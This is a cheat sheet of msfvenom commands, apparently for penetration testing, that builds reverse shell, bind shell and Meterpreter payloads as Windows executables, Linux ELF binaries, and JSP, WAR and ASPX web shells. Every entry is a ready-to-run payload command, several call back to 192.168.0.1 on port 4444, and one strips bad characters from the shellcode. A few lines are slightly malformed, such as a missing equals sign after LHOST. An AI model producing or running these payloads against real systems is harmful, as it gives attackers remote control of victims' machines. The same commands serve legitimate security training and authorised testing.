# MSFVENOM 32 Bit (x86) Reverse Shell: Windows Binary (.exe)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
```

# MSFVENOM 32 Bit (x86) Bind Shell: Windows Binary (.exe)
```bash
msfvenom -p windows/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe
```

# MSFVENOM 32 Bit (x86) Output in Hex, C Style, Exclude bad chars, Exitfunction thread:
```bash
msfvenom -p windows/shell_bind_tcp LHOST=192.168.0.1 LPORT=4444 EXITFUNC=thread -b "\x00\x0a\x0d\x5c\x5f\x2f\x2e\x40" -f c -a x86 --platform windows
```

# MSFVENOM 64 Bit (x64) Reverse Shell:
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
```

# MSFVENOM 64 Bit (x64) Bind Shell:
```bash
msfvenom -p windows/x64/shell_bind_tcp LPORT=4444 -f exe -o bind_shell.exe
```

# MSFVENOM 64 Bit (x64) Meterpreter:
```bash
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f exe -o shell.exe
```


# MSFVENOM Linux Binary (.elf) 32 Bit (x86) Reverse Shell:
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf
```

# MSFVENOM Linux Binary (.elf) 32 Bit (x86) Bind Shell:
```bash
msfvenom -p linux/x86/shell/bind_tcp  LHOST=192.168.0.1 -f elf > bind_shell.elf
```

# MSFVENOM Linux Binary (.elf) 64 Bit (x64) Reverse Shell:
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f elf > rev_shell.elf
```

# MSFVENOM Linux Binary (.elf) 64 Bit (x64) Bind Shell:
```bash
msfvenom -p linux/x64/shell/bind_tcp LHOST=192.168.0.1 -f elf > rev_shell.elf
```

# MSFVENOM Java Server Pages (.jsp)
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST192.168.0.1 LPORT=4444 -f raw > shell.jsp
```

# MSFVENOM As .war:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f war -o shell.war
```

# MSFVENOM Active Sever Pages Extended (.aspx)
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.1 LPORT=4444 -f aspx -o rev_shell.aspx
```
